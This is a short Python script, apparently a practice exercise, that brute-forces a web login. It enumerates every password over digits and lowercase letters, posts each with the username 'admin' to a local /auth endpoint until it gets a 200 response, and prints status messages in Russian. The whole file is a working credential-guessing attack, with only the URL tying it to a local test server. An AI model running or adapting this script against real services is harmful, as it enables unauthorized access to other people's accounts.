import requests


state = 0
digits_count = 0
alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'


def next_password():
    global state
    global digits_count

    n = state
    base = len(alphabet)
    result = ''
    while len(result) < digits_count:
        rest = n % base
        result = alphabet[rest] + result
        n //= base

    state += 1
    if state == base ** digits_count:
        state = 0
        digits_count += 1

    return result


while True:
    password = next_password()
    data = {'login': 'admin', 'password': password}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print('-' * 25)
        print('Пароль  <', password, '>  ПОДОШЕЛ!!!')
        print('-' * 25)
        break
    else:
        print(password, 'не подошел')
